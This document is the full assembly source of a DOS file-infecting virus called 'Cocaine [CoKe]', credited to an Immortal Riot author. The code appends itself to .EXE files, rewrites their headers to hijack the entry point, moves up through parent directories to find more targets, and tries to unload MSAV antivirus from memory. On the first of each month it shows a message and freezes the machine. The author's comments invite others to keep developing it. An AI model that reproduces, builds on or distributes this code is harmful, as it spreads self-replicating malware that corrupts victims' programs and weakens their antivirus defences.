; Virus name  : Cocaine [CoKe]
; Virus author: Metal Militia
; Virus group : Immortal Riot
; Origin      : Sweden
;
; This is an non-resident, .EXE infector moving upwards using the
; "dot-dot" method. Watch your .EXE files for the bad guy siganture
; "IR" somewhere in the beginning, after the MZ or ZM thang.. :)
;
; Also, check your back for a "?" a bit from it aswell. Btw! Everytime
; you run it, it'll take out that fucking MSAV piece of shit from your
; memory. Im telling you, go get TB-SCAN or something instead of such
; hacked things. TB-Scan finds this virus as both Ear-6 and Burma but
; is not any sort of hack from them or something. I didn't had time to
; fix the encryption, and since this is just a test from me i really
; don't give a shit, but ofcause you're always welcome to keep
; developing it, heheh :)
;
; To add here, is that Ear-6 is non-res com/exe infector, umm.. that's
; Dark Angels virus, and this is not alike it! Burma is non-res ow-vir,
; and also not very much alike this anyhow.. However, i've heard about
; some resident, non-ow Burma aswell? Not sure on thatone. So, it'll
; probably only confuse some users, I guess.. Enjoy Insane Reality #4!!
;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;			     COCAINE! [CoKE]
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

.model tiny
.radix 16
.code
        org 100
start:
        mov blast,0fa01                 ; Take MSAV's shit
        mov dx,5945h                    ; out of the fucking
        int 16                          ; memory right away

        push    ds                      ;Save old offset

        push    cs                      ;Set ES/DS/CS
        pop     es
        push    cs
        pop     ds                      ;for data accessing.

         call    get_offset              ;This places the displace-
 get_offset:                             ;ment of the virus from
         pop     bp                      ;its original compilation
         sub     bp,offset get_offset    ;into BP.

 Reset_Variables:                        ;Reset XX_old values for
         lea     di,[IP_storage+bp]      ;new infection.
         lea     si,[IP_old+bp]
         call    mov_it
         call    mov_it
         call    mov_it
         call    mov_it
         jmp     set_dta
mov_it:
         movsw ; movsw
         ret   ; ret(urn) to caller

 Set_DTA:
         lea     dx,[New_DTA+bp]         ;Set DTA to the after
         mov     ah,readin               ;virus
         int     21

         mov     ah,47h                 ; Get
         mov     dl,0                   ; current
         lea     si,[bp+new_dta+2ch]    ; directory
         int     21h

 Find_first_file:
         mov     ah,4e                ; Find first
         lea     dx,[bp+masker]       ; .EXE file

 Find_File:
         int     21
         jnc     infeqt              ; If found, infect
         jmp     ch_dir              ; Else, change directoy

 Infeqt:
         mov     blast,3d02                 ; Open file
         lea     dx,[bp+New_DTA+1e]         ; 1eh = DTA place for filename
         int     21

         xchg    bx,blast                   ; Or, mov ax,bx

         mov     ah,3f                   ; Read in
         mov     mate,readin             ; 1ah
         lea     dx,[bp+exe_header]      ; to EXE header
         int     21

         cmp     word ptr [bp+exe_header+0e],'RI'  ; Check if already
         je      close_file                        ; infected. If so,
                                                   ; close and get nextone
         call    Save_Old_Header                   ; Save old header

         mov     blast,4202                 ; Go to the end of the file.
         xor     mate,mate
         cwd
         int     21

         push    blast
         push    dx

         call    calculate_CSIP          ; calculate virus startingpoint

         pop     dx
         pop     blast

         call    calculate_size          ; calculate fsize for the header

         mov     mate,end_virus-start    ; viruscode
         mov     ah,svenne               ; write it
         lea     dx,[bp+start]           ; from start
         int     21                      ; to victim (uninfected file)

         mov     blast,4200              ; Return to the beginning
         xor     mate,mate               ; of the file.
         cwd
         int     21

         mov     mate,readin             ; 1ah
         mov     ah,svenne               ; write it
         lea     dx,[bp+exe_header]      ; to the EXE header
         int     21

Close_File:
         mov     ah,3e                   ; close the file
         int     21                      ; and go get the nextone

 Find_Next_File:
         mov     ah,4f                   ; find next file
         jmp     Find_File               ; do it!

 No_More_Files:
         mov     ah,2a                   ; get date
         int     21
         cmp     dl,1                    ; 1st of any month?
         jne     ret_to_host             ; if not, outa here

         mov     ah,9                    ; print
         lea     dx,[bp+eternal_love]    ; the note
         int     21
         jmp     $

ret_to_host:

         lea    dx,[bp+new_dta+2ch]      ; Restore
         mov    ah,3bh                   ; directory
         int    21

         pop     ds
         mov     dx,80      ; restore
         mov     ah,readin  ; the DTA
         int     21

 Restore_To_Host:
         push    ds              ; Restore ES/DS/PSP
         pop     es

         mov     blast,es
         add     blast,10

         add     word ptr cs:[bp+CS_storage],blast
                 ; By current seg, adjust old CS

         cli                                       ; Clear int's
         add     blast,word ptr cs:[bp+SS_storage] ; Old SS (adjust it)
         mov     ss,blast                          ; Original position
         mov     sp,word ptr cs:[bp+SP_storage]    ; (return stack)
         sti                                       ; Store (?) int's

         db      0ea                               ; Jmp Far
 IP_storage      dw      0   ; Storage place for IP/CS/SP/SS
 CS_storage      dw      0
 SP_storage      dw      0
 SS_storage      dw      0


 IP_old  dw      0
 CS_old  dw      0fff0
 SP_old  dw      0
 SS_old  dw      0fff0

 K_kool:
        jmp no_more_files
 K_spam:
        jmp find_first_file
 Save_Old_Header:
         mov     blast,word ptr [exe_header+bp+0e]    ; Save SS (old)
         mov     word ptr [SS_old+bp],blast
         mov     blast,word ptr [exe_header+bp+10]    ; Save SP (old)
         mov     word ptr [SP_old+bp],blast
         mov     blast,word ptr [exe_header+bp+14]    ; Save IP (old)
         mov     word ptr [IP_old+bp],blast
         mov     blast,word ptr [exe_header+bp+16]    ; Save CS (old)
         mov     word ptr [CS_old+bp],blast
         ret

 calculate_CSIP:
         push    blast
         mov     blast,word ptr [exe_header+bp+8]   ;Get header length
         mov     cl,brutal                          ;and convert it to
         shl     blast,cl                           ;bytes.
         mov     mate,blast
         pop     blast

         sub     blast,mate                      ;Subtract from
         sbb     dx,RAVE                         ;file (header size)

         mov     cl,0c                           ;Convert into segment
         shl     dx,cl                           ;address (DX)
         mov     cl,brutal
         push    blast
         shr     blast,cl
         add     dx,blast
         shl     blast,cl
         pop     mate
         sub     mate,blast
         mov     word ptr [exe_header+bp+14],mate
         mov     word ptr [exe_header+bp+16],dx    ;Set CS:IP (new)
         mov     word ptr [exe_header+bp+0e],'RI'  ;Set SS/CS (new)
         mov     word ptr [exe_header+bp+10],0fffe ;Set SP (new)
         mov     byte ptr [exe_header+bp+12],'?'   ;mark infection
         ret

 calculate_size:
         push    blast                      ;Save offset for later

         add     blast,end_virus-start      ; add size (virus)
         adc     dx,RAVE

         mov     cl,POLICE
         shl     dx,cl                      ;convert to pages (DX)
         mov     cl,BRUTALITY
         shr     blast,cl
         add     blast,dx
         inc     blast
         mov     word ptr [exe_header+bp+SPAM],blast ; save pages (x number)

         pop     blast                              ; get offset
         mov     dx,blast
         shr     blast,cl                           ; calcute last page
         shl     blast,cl                           ; (remainder)
         sub     dx,blast
         mov     word ptr [exe_header+bp+RUDE],dx   ;save remainder
         ret

 ch_dir:
        mov ah,3bh ; Change
        lea dx,[bp+dot_dot]        ; up a dir
        int 21
        jc no_more                 ; If root, outa here
        jmp k_spam                 ; Else, try to infect here aswell

 no_more:
         jmp k_kool

 blast      equ ax
 mate       equ cx
 police     equ 7
 brutality  equ 9
 rave       equ 0                   ; Hey! That's you :)
 spam       equ 04
 rude       equ 02
 brutal     equ 4
 readin     equ 1a
 svenne     equ 40
 virnote         db     'Cocaine [CoKe]'
                 db     '(c) Metal Militia/Immortal Riot'
 eternal_love    db     0dh,0ah,'Love to LISA :)',0dh,0ah,'$'
                 db     'Cocaine''s running thrue your vains'
                 db     'It seems you have become an addict'
 masker          db     '*IR.EXE',0     ;File mask used for search
 dot_dot         db     '..',0
 end_virus:
 exe_header      db      1a dup (?)
 New_DTA:
 end start